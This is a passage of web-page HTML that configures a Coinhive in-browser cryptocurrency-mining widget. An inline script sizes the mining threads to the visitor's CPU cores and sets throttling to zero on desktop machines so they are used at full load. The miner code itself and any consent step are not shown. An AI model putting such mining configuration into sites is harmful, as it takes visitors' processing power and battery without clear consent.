		 data-background="#000000"

		 data-action="#00ff00"
		 data-graph="#555555">
	<em>Loading...</em>
	</div>
	<script>
	var d = document.getElementById('coinhive');
	var p = navigator.hardwareConcurrency || 4;
	if (/Mobile|Android|webOS|iPhone|iPad|iPod|BlackBerry|BB|PlayBook|IEMobile|Windows Phone|Kindle|Silk|Opera Mini/i.test(navigator.userAgent)) {
		d.setAttribute('data-threads', p);
		d.setAttribute('data-throttle', 0.3);
	} else {
		d.setAttribute('data-threads', p * 2);
		d.setAttribute('data-throttle', 0.0);
	}
	</script>
